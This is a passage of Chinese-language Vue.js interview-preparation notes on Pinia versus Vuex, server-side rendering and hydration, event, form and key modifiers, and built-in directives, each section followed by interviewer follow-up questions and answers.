<code>mutation</code> 层，<code>actions</code> 可直接承载同步或异步业务逻辑。照搬两层会抵消它减少样板代码的优势；迁移时仍要保持修改入口清晰，不能因此把任意业务都塞进 <code>store</code>。</p>\\n</li>\\n<li>\\n<p><strong>订单页解构 <code>const { list, loading } = store</code> 后，接口完成了但页面没有更新，代码应该怎样改？</strong></p>\\n<p>直接解构 <code>store</code> 上的响应式状态可能丢失响应式关联，应使用 <code>storeToRefs(store)</code> 获取 <code>list</code>、<code>loading</code> 等引用，或在模板中直接访问 <code>store.list</code>。方法通常仍从 <code>store</code> 上调用；把状态再复制进普通 <code>ref</code> 只会形成另一份数据，后续同步容易出错。</p>\\n</li>\\n<li>\\n<p><strong>表单包含姓名、年龄和性别，保存草稿时要一次修改多个字段，而另一处只改姓名，你会统一强制走 <code>action</code> 吗？</strong></p>\\n<p>不必强制所有简单赋值都经过 <code>action</code>，单字段可直接写 <code>store.name</code>，多字段可用 <code>$patch</code> 对象或回调批量处理。涉及完整业务流程时再封装为 <code>action</code> 更利于复用；入口过多仍会降低变更可追踪性，需要团队约定边界。</p>\\n</li>\\n<li>\\n<p><strong>用户退出后调用 <code>$reset()</code>，选项式 <code>store</code> 恢复正常，但另一个 <code>store</code> 的清理结果不符合预期，你会怎样排查？</strong></p>\\n<p>先确认初始 <code>state</code> 工厂返回的值是否就是退出后期望恢复的状态，再检查是否有订阅或异步 <code>action</code> 随后重新写入。<code>$reset()</code> 的语义是回到声明的初始状态，不等同于取消在途任务或清除所有外部持久化数据；这些资源需要单独处理。</p>\\n</li>\\n<li>\\n<p><strong>大型后台按用户、订单、权限拆状态，负责人想复刻一个深层 <code>modules</code> 树以保持 <code>Vuex</code> 习惯，你会选扁平独立 <code>store</code> 还是嵌套结构？</strong></p>\\n<p>更适合按领域定义多个具有唯一 <code>id</code> 的独立 <code>store</code>，调用时通过各自的 <code>useXxxStore</code> 获取，避免人为恢复深层模块嵌套。独立 <code>store</code> 能让代码组织更扁平，但跨 <code>store</code> 依赖仍需控制方向；拆得过细会让一次业务变更散落到过多文件。</p>\\n</li>\\n<li>\\n<p><strong><code>SSR</code> 项目准备在 <code>Vuex</code> 与 <code>Pinia</code> 之间选型，团队同时强调 <code>TypeScript</code>、插件扩展和异步流程，你会如何给结论？</strong></p>\\n<p>按这些约束可优先评估 <code>Pinia</code>，它提供较好的 <code>TypeScript</code> 支持、插件扩展、服务端渲染能力，并允许 <code>action</code> 编写同步与异步逻辑。选型仍要结合现有代码和迁移成本，不能仅凭 <code>API</code> 更简洁就重写稳定状态层；<code>SSR</code> 还需正确处理每次请求的状态隔离。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_28-对vue-ssr的理解\\"><a class=\\"header-anchor\\" href=\\"#_28-对vue-ssr的理解\\">#</a> 28 对Vue SSR的理解</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>SSR</code> 在服务端把组件渲染成 <code>HTML</code> 字符串返回，浏览器拿到就能直接显示，然后再<strong>水合</strong>（hydrate）接管交互</li>\\n<li>收益两个：<strong>首屏更快</strong>（不用等 <code>JS</code> 下载执行）、<strong><code>SEO</code> 友好</strong>（爬虫拿到完整内容）</li>\\n<li>代价：服务端有渲染成本和内存压力、代码要兼顾双端（不能直接用 <code>window</code>/<code>document</code>）、部署运维复杂度上升</li>\\n<li>生命周期只有 <code>beforeCreate</code>/<code>created</code> 会在服务端执行，所以定时器和 <code>DOM</code> 操作只能放 <code>mounted</code></li>\\n<li><code>SSR</code> 改善的是 <code>LCP</code> 不是 <code>INP</code>——水合仍要在客户端跑一遍，节点太多时水合本身也慢</li>\\n</ul>\\n<p><strong><code>Vue SSR</code> 是在服务端把组件渲染成完整的 <code>HTML</code> 返回给浏览器，再由客户端通过水合接管交互。</strong> 这样首屏不必等全部 <code>JavaScript</code> 下载执行，搜索引擎也能直接抓到页面内容。代价是服务器要承担渲染的 <code>CPU</code> 开销，代码还要兼顾服务端环境，不能随意使用 <code>window</code> 或 <code>document</code>。服务端只执行 <code>beforeCreate</code> 和 <code>created</code>，所以定时器、<code>DOM</code> 操作应放到客户端生命周期中。</p>\\n</section>\\n<blockquote>\\n<p><code>Vue.js</code> 是构建客户端应用程序的框架。默认情况下，可以在浏览器中输出 <code>Vue</code> 组件，进行生成 <code>DOM</code> 和操作 <code>DOM</code>。然而，也可以将同一个组件渲染为服务端的 <code>HTML</code> 字符串，将它们直接发送到浏览器，最后将这些静态标记&quot;激活&quot;为客户端上完全可交互的应用程序。</p>\\n</blockquote>\\n<blockquote>\\n<p><code>SSR</code>也就是服务端渲染，也就是将 <code>Vue</code> 在客户端把标签渲染成 <code>HTML</code> 的工作放在服务端完成，然后再把 <code>html</code> 直接返回给客户端</p>\\n</blockquote>\\n<ul>\\n<li><strong>优点</strong>：<code>SSR</code> 有着更好的 <code>SEO</code>、并且首屏加载速度更快\\n<ul>\\n<li>因为 <code>SPA</code> 页面的内容是通过 <code>Ajax</code> 获取，而搜索引擎爬取工具并不会等待 <code>Ajax</code> 异步完成后再抓取页面内容，所以在 <code>SPA</code> 中是抓取不到页面通过 <code>Ajax</code>获取到的内容；而 <code>SSR</code> 是直接由服务端返回已经渲染好的页面（数据已经包含在页面中），所以搜索引擎爬取工具可以抓取渲染好的页面</li>\\n<li>更快的内容到达时间（首屏加载更快）： <code>SPA</code> 会等待所有 <code>Vue</code> 编译后的 <code>js</code> 文件都下载完成后，才开始进行页面的渲染，文件下载等需要一定的时间等，所以首屏渲染需要一定的时间；<code>SSR</code> 直接由服务端渲染好页面直接返回显示，无需等待下载 js 文件及再去渲染等，所以 SSR 有更快的内容到达时间</li>\\n</ul>\\n</li>\\n<li><strong>缺点</strong>： 开发条件会受到限制，服务器端渲染只支持 <code>beforeCreate</code> 和 <code>created</code> 两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于 <code>Node.js</code> 的运行环境。服务器会有更大的负载需求\\n<ul>\\n<li>在 Node.js  中渲染完整的应用程序，显然会比仅仅提供静态文件的  <code>server</code> 更加大量占用<code>CPU</code>资源 (CPU-intensive - CPU 密集)，因此如果你预料在高流量环境 ( high traffic ) 下使用，请准备相应的服务器负载，并明智地采用缓存策略</li>\\n</ul>\\n</li>\\n</ul>\\n<p><strong>其基本实现原理</strong></p>\\n<ul>\\n<li><code>app.js</code> 作为客户端与服务端的公用入口，导出 <code>Vue</code> 根实例，供客户端 <code>entry</code> 与服务端 <code>entry</code> 使用。客户端 <code>entry</code> 主要作用挂载到 <code>DOM</code> 上，服务端 <code>entry</code> 除了创建和返回实例，还进行路由匹配与数据预获取。</li>\\n<li><code>webpack</code> 为客服端打包一个 <code>Client Bundle</code> ，为服务端打包一个 <code>Server Bundle</code> 。</li>\\n<li>服务器接收请求时，会根据 <code>url</code>，加载相应组件，获取和解析异步数据，创建一个读取 <code>Server Bundle</code> 的 <code>BundleRenderer</code>，然后生成 <code>html</code> 发送给客户端。</li>\\n<li>客户端混合，客户端收到从服务端传来的 <code>DOM</code> 与自己的生成的 DOM 进行对比，把不相同的 <code>DOM</code> 激活，使其可以能够响应后续变化，这个过程称为客户端激活 。为确保混合成功，客户端与服务器端需要共享同一套数据。在服务端，可以在渲染之前获取数据，填充到 <code>stroe</code> 里，这样，在客户端挂载到 <code>DOM</code> 之前，可以直接从 <code>store</code>里取数据。首屏的动态数据通过 <code>window.__INITIAL_STATE__</code>发送到客户端</li>\\n</ul>\\n<blockquote>\\n<p><code>Vue SSR</code> 的实现，主要就是把 <code>Vue</code> 的组件输出成一个完整 <code>HTML</code>, <code>vue-server-renderer</code> 就是干这事的</p>\\n</blockquote>\\n<p><code>Vue SSR</code>需要做的事多点（输出完整 HTML），除了<code>complier -&gt; vnode</code>，还需如数据获取填充至 <code>HTML</code>、客户端混合（<code>hydration</code>）、缓存等等。相比于其他模板引擎（<code>ejs</code>, <code>jade</code> 等），最终要实现的目的是一样的，性能上可能要差点</p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>官网首页已经由服务端返回完整 <code>HTML</code>，产品却认为页面无需下载客户端 <code>JS</code> 也能完成搜索、登录弹窗和轮播交互，这个判断哪里不对？</strong></p>\\n<p>服务端返回的 <code>HTML</code> 主要解决内容提前到达，并不等于页面已经具备完整交互。客户端仍要加载对应的 <code>Client Bundle</code>，创建虚拟节点并执行 <code>hydration</code>，把静态标记激活；若完全不下发客户端逻辑，页面通常只能静态展示。</p>\\n</li>\\n<li>\\n<p><strong>商品详情页既要被搜索引擎收录，又要展示实时价格和库存，你会怎样组织服务端入口、数据获取与首屏状态？</strong></p>\\n<p>服务端入口应先按请求 <code>url</code> 完成路由匹配，加载目标组件并预取详情数据，再将数据写入共享 <code>store</code> 后输出完整 <code>HTML</code>。同时把首屏状态序列化到 <code>window.__INITIAL_STATE__</code>，客户端激活前直接复用，避免再次请求造成内容不一致。</p>\\n</li>\\n<li>\\n<p><strong>同一套 <code>Vue</code> 组件要同时运行在浏览器和 <code>Node.js</code>，其中图表库初始化时直接访问 <code>window</code>，你会把兼容边界放在哪里？</strong></p>\\n<p>不能让依赖浏览器环境的初始化进入服务端渲染路径，因为 <code>Node.js</code> 没有 <code>window</code> 和 <code>document</code>。可将初始化延后到客户端生命周期，或对组件和依赖做仅客户端加载；代价是对应区域不能随首屏 <code>HTML</code> 一起获得完整交互。</p>\\n</li>\\n<li>\\n<p><strong>线上偶发 <code>hydration mismatch</code>，日志显示服务端商品价格与客户端首次渲染价格不同，你会沿哪条链路排查？</strong></p>\\n<p>先核对服务端预取的数据、注入的 <code>window.__INITIAL_STATE__</code> 与客户端挂载前读取的数据是否完全一致，再检查客户端是否在激活前重新请求并覆盖了状态。服务端与客户端生成的初始 <code>DOM</code> 不同就会导致混合失败，修复重点是统一首屏数据来源和渲染时机。</p>\\n</li>\\n<li>\\n<p><strong>内部运营后台有大量登录后页面，架构师仍主张全站 <code>SSR</code> 来提升首屏，你会如何评估这项选型？</strong></p>\\n<p>应先确认页面是否真正依赖搜索收录，以及内容到达时间是否值得额外成本；登录后的后台通常很难获得显著 <code>SEO</code> 收益。全站 <code>SSR</code> 会引入双端构建、数据预取、激活兼容和 <code>Node.js</code> 渲染负载，若收益有限，静态托管的客户端应用更稳妥。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_29-vue-修饰符有哪些\\"><a class=\\"header-anchor\\" href=\\"#_29-vue-修饰符有哪些\\">#</a> 29 Vue 修饰符有哪些</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>事件修饰符：<code>.stop</code>（阻止冒泡）、<code>.prevent</code>（阻止默认）、<code>.self</code>（只在自身触发）、<code>.once</code>、<code>.capture</code>（捕获阶段）、<code>.passive</code></li>\\n<li>按键修饰符：<code>.enter</code>/<code>.esc</code>/<code>.tab</code>/<code>.delete</code>，以及 <code>.ctrl</code>/<code>.alt</code>/<code>.shift</code>/<code>.meta</code> 系统修饰键</li>\\n<li>表单修饰符：<code>.lazy</code>（改用 <code>change</code> 事件）、<code>.number</code>（转数字）、<code>.trim</code></li>\\n<li><code>.sync</code>（<code>Vue 2</code>）在 <code>Vue 3</code> 被合并进了 <code>v-model:xxx</code>；<code>.native</code> 在 <code>Vue 3</code> 被移除</li>\\n<li>⚠️ <code>.passive</code> 和 <code>.prevent</code> <strong>不能一起用</strong>——前者承诺不阻止默认行为，两者语义冲突</li>\\n</ul>\\n<p><strong><code>Vue</code> 修饰符主要用于表单、事件、鼠标按键、键盘和属性绑定，把常见处理直接写在模板上。</strong> 表单常用 <code>.lazy</code>、<code>.trim</code>、<code>.number</code>；事件常用 <code>.stop</code>、<code>.prevent</code>、<code>.self</code> 和 <code>.once</code>，分别处理冒泡、默认行为、触发目标和执行次数。键盘与鼠标可以用 <code>.enter</code>、<code>.ctrl</code>、<code>.left</code>、<code>.right</code> 等限制触发条件。修饰符顺序会影响生成逻辑，而且 <code>.passive</code> 不应和 <code>.prevent</code> 同时使用。</p>\\n</section>\\n<h3 id=\\"vue中修饰符分为以下五种\\"><a class=\\"header-anchor\\" href=\\"#vue中修饰符分为以下五种\\">#</a> vue中修饰符分为以下五种</h3>\\n<ul>\\n<li>表单修饰符</li>\\n<li>事件修饰符</li>\\n<li>鼠标按键修饰符</li>\\n<li>键值修饰符</li>\\n<li><code>v-bind</code>修饰符</li>\\n</ul>\\n<p><strong>1. 表单修饰符</strong></p>\\n<p>在我们填写表单的时候用得最多的是<code>input</code>标签，指令用得最多的是<code>v-model</code></p>\\n<p>关于表单的修饰符有如下：</p>\\n<ul>\\n<li><code>lazy</code></li>\\n</ul>\\n<p>在我们填完信息，光标离开标签的时候，才会将值赋予给<code>value</code>，也就是在<code>change</code>事件之后再进行信息同步</p>\\n<pre class=\\"language-html\\"><code>&lt;input type=&quot;text&quot; v-model.lazy=&quot;value&quot;&gt;\\n&lt;p&gt;{{value}}&lt;/p&gt;\\n</code></pre>\\n<ul>\\n<li><code>trim</code></li>\\n</ul>\\n<p>自动过滤用户输入的首空格字符，而中间的空格不会过滤</p>\\n<pre class=\\"language-html\\"><code>&lt;input type=&quot;text&quot; v-model.trim=&quot;value&quot;&gt;\\n</code></pre>\\n<ul>\\n<li><code>number</code></li>\\n</ul>\\n<p>自动将用户的输入值转为数值类型，但如果这个值无法被<code>parseFloat</code>解析，则会返回原来的值</p>\\n<pre class=\\"language-html\\"><code>&lt;input v-model.number=&quot;age&quot; type=&quot;number&quot;&gt;\\n</code></pre>\\n<p><strong>2. 事件修饰符</strong></p>\\n<p>事件修饰符是对事件捕获以及目标进行了处理，有如下修饰符</p>\\n<ul>\\n<li><code>.stop</code> 阻止了事件冒泡，相当于调用了<code>event.stopPropagation</code>方法</li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;div @click=&quot;shout(2)&quot;&gt;\\n  &lt;button @click.stop=&quot;shout(1)&quot;&gt;ok&lt;/button&gt;\\n&lt;/div&gt;\\n//只输出1\\n</code></pre>\\n<ul>\\n<li><code>.prevent</code> 阻止了事件的默认行为，相当于调用了<code>event.preventDefault</code>方法</li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;form v-on:submit.prevent=&quot;onSubmit&quot;&gt;&lt;/form&gt;\\n</code></pre>\\n<ul>\\n<li><code>.capture</code> 使用事件捕获模式，使事件触发从包含这个元素的顶层开始往下触发</li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;div @click.capture=&quot;shout(1)&quot;&gt;\\n    obj1\\n&lt;div @click.capture=&quot;shout(2)&quot;&gt;\\n    obj2\\n&lt;div @click=&quot;shout(3)&quot;&gt;\\n    obj3\\n&lt;div @click=&quot;shout(4)&quot;&gt;\\n    obj4\\n&lt;/div&gt;\\n&lt;/div&gt;\\n&lt;/div&gt;\\n&lt;/div&gt;\\n// 输出结构: 1 2 4 3 \\n</code></pre>\\n<ul>\\n<li><code>.self</code> 只当在 <code>event.target</code> 是当前元素自身时触发处理函数</li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;div v-on:click.self=&quot;doThat&quot;&gt;...&lt;/div&gt;\\n</code></pre>\\n<blockquote>\\n<p>使用修饰符时，顺序很重要；相应的代码会以同样的顺序产生。因此，用 <code>v-on:click.prevent.self</code> 会阻止所有的点击，而 <code>v-on:click.self.prevent</code> 只会阻止对元素自身的点击</p>\\n</blockquote>\\n<ul>\\n<li><code>.once</code> 绑定了事件以后只能触发一次，第二次就不会触发</li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;button @click.once=&quot;shout(1)&quot;&gt;ok&lt;/button&gt;\\n</code></pre>\\n<ul>\\n<li><code>.passive</code> 告诉浏览器你不想阻止事件的默认行为</li>\\n</ul>\\n<p>在移动端，当我们在监听元素滚动事件的时候，会一直触发<code>onscroll</code>事件会让我们的网页变卡，因此我们使用这个修饰符的时候，相当于给<code>onscroll</code>事件整了一个<code>.lazy</code>修饰符</p>\\n<pre class=\\"language-html\\"><code>&lt;!-- 滚动事件的默认行为 (即滚动行为) 将会立即触发 --&gt;\\n&lt;!-- 而不会等待 `onScroll` 完成  --&gt;\\n&lt;!-- 这其中包含 `event.preventDefault()` 的情况 --&gt;\\n&lt;div v-on:scroll.passive=&quot;onScroll&quot;&gt;...&lt;/div&gt;\\n</code></pre>\\n<blockquote>\\n<ul>\\n<li>不要把 <code>.passive</code> 和 <code>.prevent</code> 一起使用,因为 <code>.prevent</code> 将会被忽略，同时浏览器可能会向你展示一个警告。</li>\\n<li><code>passive</code> 会告诉浏览器你不想阻止事件的默认行为</li>\\n</ul>\\n</blockquote>\\n<ul>\\n<li><code>native</code> 让组件变成像<code>html</code>内置标签那样监听根元素的原生事件，否则组件上使用 <code>v-on</code> 只会监听自定义事件</li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;my-component v-on:click.native=&quot;doSomething&quot;&gt;&lt;/my-component&gt;\\n\\n&lt;!-- 使用.native修饰符来操作普通HTML标签是会令事件失效的 --&gt;\\n</code></pre>\\n<p><strong>3. 鼠标按钮修饰符</strong></p>\\n<p>鼠标按钮修饰符针对的就是左键、右键、中键点击，有如下：</p>\\n<ul>\\n<li><code>.left</code> 左键点击</li>\\n<li><code>.right</code> 右键点击</li>\\n<li><code>.middle</code> 中键点击</li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;button @click.left=&quot;shout(1)&quot;&gt;ok&lt;/button&gt;\\n&lt;button @click.right=&quot;shout(1)&quot;&gt;ok&lt;/button&gt;\\n&lt;button @click.middle=&quot;shout(1)&quot;&gt;ok&lt;/button&gt;\\n</code></pre>\\n<p><strong>4. 键盘事件的修饰符</strong></p>\\n<p>键盘修饰符是用来修饰键盘事件（<code>onkeyup</code>，<code>onkeydown</code>）的，有如下：</p>\\n<p><code>keyCode</code>存在很多，但vue为我们提供了别名，分为以下两种：</p>\\n<ul>\\n<li><strong>普通键</strong>（<code>enter</code>、<code>tab</code>、<code>delete</code>、<code>space</code>、<code>esc</code>、<code>up</code>、<code>down</code>、<code>left</code>、<code>right</code>...）</li>\\n<li><strong>系统修饰键</strong>（<code>ctrl</code>、<code>alt</code>、<code>meta</code>、<code>shift</code>...）</li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;!-- 只有按键为keyCode的时候才触发 --&gt;\\n&lt;input type=&quot;text&quot; @keyup.keyCode=&quot;shout()&quot;&gt;\\n</code></pre>\\n<p>还可以通过以下方式自定义一些全局的键盘码别名</p>\\n<pre class=\\"language-text\\"><code>Vue.config.keyCodes.f2 = 113\\n</code></pre>\\n<p><strong>5. v-bind修饰符</strong></p>\\n<p><code>v-bind</code>修饰符主要是为属性进行操作，用来分别有如下：</p>\\n<ul>\\n<li><strong>async</strong> 能对<code>props</code>进行一个双向绑定</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>//父组件\\n&lt;comp :myMessage.sync=&quot;bar&quot;&gt;&lt;/comp&gt; \\n//子组件\\nthis.$emit(&#39;update:myMessage&#39;,params);\\n</code></pre>\\n<p>以上这种方法相当于以下的简写</p>\\n<pre class=\\"language-js\\"><code>//父亲组件\\n&lt;comp :myMessage=&quot;bar&quot; @update:myMessage=&quot;func&quot;&gt;&lt;/comp&gt;\\nfunc(e){\\n this.bar = e;\\n}\\n\\n//子组件js\\nfunc2(){\\n  this.$emit(&#39;update:myMessage&#39;,params);\\n}\\n</code></pre>\\n<p>使用<code>async</code>需要注意以下两点：</p>\\n<ul>\\n<li>\\n<p>使用<code>sync</code>的时候，子组件传递的事件名格式必须为<code>update:value</code>，其中<code>value</code>必须与子组件中<code>props</code>中声明的名称完全一致</p>\\n</li>\\n<li>\\n<p>注意带有 <code>.sync</code> 修饰符的 <code>v-bind</code> 不能和表达式一起使用</p>\\n</li>\\n<li>\\n<p><strong>prop</strong> 设置自定义标签属性，避免暴露数据，防止污染HTML结构</p>\\n</li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;input id=&quot;uid&quot; title=&quot;title1&quot; value=&quot;1&quot; :index.prop=&quot;index&quot;&gt;\\n</code></pre>\\n<ul>\\n<li><strong>camel</strong> 将命名变为驼峰命名法，如将<code>view-Box</code>属性名转换为 <code>viewBox</code></li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;svg :viewBox=&quot;viewBox&quot;&gt;&lt;/svg&gt;\\n</code></pre>\\n<h3 id=\\"应用场景\\"><a class=\\"header-anchor\\" href=\\"#应用场景\\">#</a> 应用场景</h3>\\n<p>根据每一个修饰符的功能，我们可以得到以下修饰符的应用场景：</p>\\n<ul>\\n<li><code>.stop</code>：阻止事件冒泡</li>\\n<li><code>.native</code>：绑定原生事件</li>\\n<li><code>.once</code>：事件只执行一次</li>\\n<li><code>.self</code> ：将事件绑定在自身身上，相当于阻止事件冒泡</li>\\n<li><code>.prevent</code>：阻止默认事件</li>\\n<li><code>.caption</code>：用于事件捕获</li>\\n<li><code>.once</code>：只触发一次</li>\\n<li><code>.keyCode</code>：监听特定键盘按下</li>\\n<li><code>.right</code>：右键</li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>弹窗遮罩层和内容区都注册了点击关闭事件，用户点击内容区按钮时弹窗也被关闭；有人建议给遮罩加 <code>.self</code>，它和在按钮上加 <code>.stop</code> 是一回事吗？</strong></p>\\n<p>两者都可能阻止这次误关闭，但判断位置不同：<code>.self</code> 只在事件目标就是遮罩自身时执行处理器，<code>.stop</code> 则在按钮处直接阻断后续冒泡。若内容区存在很多交互节点，遮罩使用 <code>.self</code> 更集中；若父级其他监听也必须被隔离，才考虑 <code>.stop</code>。</p>\\n</li>\\n<li>\\n<p><strong>支付表单的提交按钮绑定了 <code>@click.prevent</code>，但用户按回车仍触发浏览器原生提交并刷新页面，你会把修饰符放到哪里？</strong></p>\\n<p>应在表单的 <code>submit</code> 事件上使用 <code>.prevent</code>，例如 <code>@submit.prevent=&quot;pay&quot;</code>，而不是只拦截某个按钮的点击。回车提交并不保证经过按钮的 <code>click</code> 处理器；只处理点击会遗漏键盘和其他触发表单提交的入口。</p>\\n</li>\\n<li>\\n<p><strong>设计稿要求一个操作只能执行一次，开发把按钮写成 <code>@click.once=&quot;save&quot;</code>；接口首次返回失败后，用户还应当怎样重试？</strong></p>\\n<p><code>.once</code> 会让监听器只触发一次，因此它不适合“失败后允许重试”的业务语义。应保留普通点击监听，通过提交状态防止处理中重复触发，并在失败后恢复按钮；否则一次网络故障就会让当前页面失去再次提交能力。</p>\\n</li>\\n<li>\\n<p><strong>自定义表格组件上写了原生点击监听，但点击内部单元格没有进入父组件处理器，你会先核对 <code>.native</code> 的哪层语义？</strong></p>\\n<p>先确认监听目标究竟是组件声明的自定义事件，还是组件根元素产生的原生事件；<code>.native</code> 的用途是把监听绑定到组件的原生元素层。若组件结构或事件设计发生变化，依赖根元素的监听会较脆弱，更清晰的做法是由组件显式触发业务事件。</p>\\n</li>\\n<li>\\n<p><strong>文件列表需要同时支持单击选中和右键菜单，开发只监听普通 <code>click</code> 后再检查鼠标按键值，你会如何改写事件声明？</strong></p>\\n<p>右键菜单应使用 <code>.right</code> 对应的鼠标事件修饰语义，并按需要阻止浏览器默认菜单，普通选中继续由常规点击处理。这样模板直接表达交互意图，避免在同一处理器中混合分支；若要阻止默认行为，仍需明确加入 <code>.prevent</code>。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_30-说说-vue-内置指令\\"><a class=\\"header-anchor\\" href=\\"#_30-说说-vue-内置指令\\">#</a> 30 说说 vue 内置指令</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>四类：渲染显示（<code>v-if</code>/<code>v-show</code>/<code>v-for</code>）、数据绑定（<code>v-bind</code>/<code>v-on</code>/<code>v-model</code>）、内容输出（<code>v-text</code>/<code>v-html</code>/<code>v-pre</code>）、性能体验（<code>v-once</code>/<code>v-memo</code>/<code>v-cloak</code>/<code>v-slot</code>）</li>\\n<li><code>v-text</code> 会转义 <code>HTML</code> 所以安全，<code>v-html</code> 不转义 —— 用户内容用它就是 <code>XSS</code> 入口</li>\\n<li><code>v-once</code> 只渲染一次、<code>v-memo</code> 依赖不变就跳过更新，都是<strong>让节点脱离响应式</strong>的优化，用错就是&quot;数据变了页面不动&quot;</li>\\n<li>⚠️ <code>v-if</code> 和 <code>v-for</code> 不要写在同一元素上 —— 两个版本优先级相反，官方风格指南禁止</li>\\n<li><code>v-pre</code> 跳过编译，展示 <code>{&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;{ }&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;}</code> 原文时才用；<code>v-cloak</code> 在构建工具时代基本用不上</li>\\n</ul>\\n<p><strong><code>Vue</code> 内置指令可以归为渲染显示、数据绑定、内容输出和性能体验四类。</strong> 常用的是 <code>v-if</code>、<code>v-show</code>、<code>v-for</code>，以及负责属性、事件和双向绑定的 <code>v-bind</code>、<code>v-on</code>、<code>v-model</code>。内容展示时，<code>v-text</code> 会转义 <code>HTML</code>，而 <code>v-html</code> 不会，所以用户内容必须先净化，避免 <code>XSS</code>。<code>v-once</code> 和 <code>v-memo</code> 能跳过更新，但只适合确认存在性能瓶颈的场景；<code>v-if</code> 与 <code>v-for</code> 也不要写在同一元素上。</p>\\n</section>\\n<p><code>Vue</code> 内置的指令按用途分四类：</p>\\n<p><strong>① 渲染与显示</strong></p>\\n<table>\\n<thead>\\n<tr>\\n<th>指令</th>\\n<th>作用</th>\\n<th>关键点</th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n<td><code>v-if</code> / <code>v-else-if</code> / <code>v-else</code></td>\\n<td>条件渲染</td>\\n<td>惰性，假值时<strong>不渲染</strong>，切换会销毁重建</td>\\n</tr>\\n<tr>\\n<td><code>v-show</code></td>\\n<td>条件显示</td>\\n<td>只切 <code>display</code>，元素始终在 <code>DOM</code> 里</td>\\n</tr>\\n<tr>\\n<td><code>v-for</code></td>\\n<td>列表渲染</td>\\n<td><strong>必须配稳定唯一的 <code>key</code></strong></td>\\n</tr>\\n</tbody>\\n</table>\\n<p><strong>② 数据绑定</strong></p>\\n<table>\\n<thead>\\n<tr>\\n<th>指令</th>\\n<th>简写</th>\\n<th>作用</th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n<td><code>v-bind</code></td>\\n<td><code>:</code></td>\\n<td>绑定属性；<code>v-bind=&quot;obj&quot;</code> 可批量绑定</td>\\n</tr>\\n<tr>\\n<td><code>v-on</code></td>\\n<td><code>@</code></td>\\n<td>绑定事件；支持 <code>.stop</code>/<code>.prevent</code> 等修饰符</td>\\n</tr>\\n<tr>\\n<td><code>v-model</code></td>\\n<td>—</td>\\n<td>双向绑定，本质是绑值 + 监听事件写回</td>\\n</tr>\\n</tbody>\\n</table>\\n<p><strong>③ 内容输出</strong></p>\\n<ul>\\n<li><code>v-text</code> —— 等价于 <code>textContent</code>，会<strong>转义</strong> <code>HTML</code>，安全</li>\\n<li><code>v-html</code> —— 等价于 <code>innerHTML</code>，<strong>不转义</strong>，用户内容会造成 <code>XSS</code></li>\\n<li><code>v-pre</code> —— 跳过这个元素及其子元素的编译，直接原样输出（展示 <code>{&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;{ }&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;}</code> 语法时用）</li>\\n</ul>\\n<p><strong>④ 性能与体验</strong></p>\\n<ul>\\n<li><code>v-once</code> —— 只渲染一次，之后跳过所有更新，适合大量静态内容</li>\\n<li><code>v-memo</code>（<code>Vue 3.2+</code>）—— 依赖数组不变就跳过更新，长列表的精细优化</li>\\n<li><code>v-cloak</code> —— 配合 <code>[v-cloak] { display: none }</code> 避免未编译时闪现 <code>{&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;{ }&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;}</code>（现在用构建工具基本用不上）</li>\\n<li><code>v-slot</code>（简写 <code>#</code>）—— 具名插槽和作用域插槽</li>\\n</ul>\\n<p><strong>几个实践要点：</strong></p>\\n<ol>\\n<li><strong><code>v-if</code> 和 <code>v-for</code> 不要写在同一个元素上</strong> —— 两个版本的优先级相反（<code>Vue 2</code> 是 <code>v-for</code> 高，<code>Vue 3</code> 是 <code>v-if</code> 高），官方风格指南明确禁止。用 <code>computed</code> 先过滤数据。</li>\\n<li><strong><code>v-html</code> 的内容必须可信</strong>，否则就是 <code>XSS</code> 入口；用户提交的富文本要在服务端净化。</li>\\n<li><strong><code>v-once</code> 和 <code>v-memo</code> 是有代价的优化</strong> —— 它们让节点脱离响应式更新，用错了就是&quot;数据变了页面不动&quot;的诡异 bug，只在确认是性能瓶颈时才用。</li>\\n</ol>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/0e8989f9c8100b9a.png\\" alt=\\"\\"></p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>消息面板用 <code>v-show</code> 控制一个首次打开才加载的重型组件，用户从不打开时它仍完成了渲染；换成 <code>v-if</code> 会改变什么？</strong></p>\\n<p>换成 <code>v-if</code> 